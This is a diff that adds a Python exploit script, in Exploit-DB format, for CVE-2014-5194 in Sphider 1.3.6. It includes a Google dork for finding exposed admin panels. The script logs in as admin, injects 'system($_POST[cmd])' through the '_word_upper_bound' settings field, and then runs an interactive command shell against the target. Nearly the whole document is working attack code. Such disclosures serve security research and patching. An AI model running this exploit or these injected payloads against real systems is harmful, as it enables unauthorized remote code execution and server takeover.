@@ -1,0 +1,141 @@
+# Exploit Title: Sphider Search Engine 1.3.6 - 'word_upper_bound' RCE (Authenticated)
+# Google Dork: intitle:"Sphider Admin Login"
+# Date: 2014-07-28
+# Exploit Author: Gurkirat Singh
+# Vendor Homepage: http://www.sphider.eu/
+# Software Link: http://www.sphider.eu/sphider-1.3.6.zip
+# Version: v1.3.6
+# Tested on: Windows and Linux
+# CVE : CVE-2014-5194
+# Proof of Concept: https://www.exploit-db.com/exploits/34189
+
+from argparse import ArgumentParser, RawTextHelpFormatter
+from huepy import *
+import string
+import random
+from bs4 import BeautifulSoup, Tag
+from requests import Session
+from randua import generate as randua
+
+_F = "".join(random.choices(string.ascii_letters, k=13))
+
+parser = ArgumentParser(description="Exploit for CVE-2014-5194",
+                        formatter_class=RawTextHelpFormatter)
+parser.add_argument("--target",
+                    "-t",
+                    help="target uri where application is installed",
+                    required=True,
+                    metavar="",
+                    dest="t")
+parser.add_argument("--user",
+                    "-u",
+                    help="username to authenticate",
+                    required=True,
+                    metavar="",
+                    dest="u")
+parser.add_argument("--password",
+                    "-p",
+                    help="password to authenticate",
+                    required=True,
+                    metavar="",
+                    dest="p")
+parser.add_argument("--debug",
+                    help="if passed, spawn the firefox window",
+                    default=True,
+                    action="store_false")
+parser.add_argument("--timeout",
+                    help="timeout in seconds (default: 1)",
+                    dest="T",
+                    metavar="",
+                    default=1)
+args = parser.parse_args()
+
+if args.t.endswith("/"):
+    args.t = args.t[:-1]
+
+print(run("Logging in"))
+
+with Session() as http:
+    data = {"user": args.u, "pass": args.p}
+
+    headers = {"User-Agent": randua()}
+    http.post(args.t + '/admin/auth.php',
+              data=data,
+              headers=headers,
+              allow_redirects=False)
+    r = http.get(args.t + '/admin/admin.php',
+                 headers=headers,
+                 allow_redirects=False)
+    html = BeautifulSoup(r.content.decode(), "lxml")
+    title: Tag = html.find("title")
+
+    if title.text == "Sphider Admin Login":
+        print(bad("Failed to login"))
+        exit(1)
+    else:
+        print(good("Logged in"))
+
+    payload = {
+        'f': 'settings',
+        'Submit': '1',
+        '_version_nr': '1.3.5',
+        '_language': 'en',
+        '_template': 'standard',
+        '_admin_email': 'admin@localhost',
+        '_print_results': '1',
+        '_tmp_dir': 'tmp',
+        '_log_dir': 'log',
+        '_log_format': 'html',
+        '_min_words_per_page': '10',
+        '_min_word_length': '3',
+        '_word_upper_bound': '100;system($_POST[cmd])',
+        '_index_numbers': '1',
+        '_index_meta_keywords': '1',
+        '_pdftotext_path': 'c:\\temp\\pdftotext.exe',
+        '_catdoc_path': 'c:\\temp\\catdoc.exe',
+        '_xls2csv_path': 'c:\\temp\\xls2csv',
+        '_catppt_path': 'c:\\temp\\catppt',
+        '_user_agent': 'Sphider',
+        '_min_delay': '0',
+        '_strip_sessids': '1',
+        '_results_per_page': '10',
+        '_cat_columns': '2',
+        '_bound_search_result': '0',
+        '_length_of_link_desc': '0',
+        '_links_to_next': '9',
+        '_show_meta_description': '1',
+        '_show_query_scores': '1',
+        '_show_categories': '1',
+        '_desc_length': '250',
+        '_did_you_mean_enabled': '1',
+        '_suggest_enabled': '1',
+        '_suggest_history': '1',
+        '_suggest_rows': '10',
+        '_title_weight': '20',
+        '_domain_weight': '60',
+        '_path_weight': '10',
+        '_meta_weight': '5'
+    }
+
+    print(run("Exploiting"))
+    http.post(args.t + "/admin/admin.php", data=payload)
+    r = http.post(args.t + "/settings/conf.php", data={"cmd": "echo %s" % _F})
+    if r.content.decode().strip() != _F:
+        print(bad("Failed"))
+        exit(1)
+    print(good("Exploited"))
+    print(info("Spawning Shell"))
+    user = http.post(args.t + "/settings/conf.php", data={"cmd": "whoami"})
+    host = http.post(args.t + "/settings/conf.php",
+                     data={"cmd": "cat /etc/hostname"})
+    shell = f"{lightgreen('%s@%s'%(user.content.decode().strip(), host.content.decode().strip()))}{blue('$ ')}"
+
+    while True:
+        try:
+            cmd = input(shell)
+            if cmd == "exit": break
+            r = http.post(args.t + "/settings/conf.php", data={"cmd": cmd})
+            print(r.content.decode().strip())
+        except:
+            break
+    print()
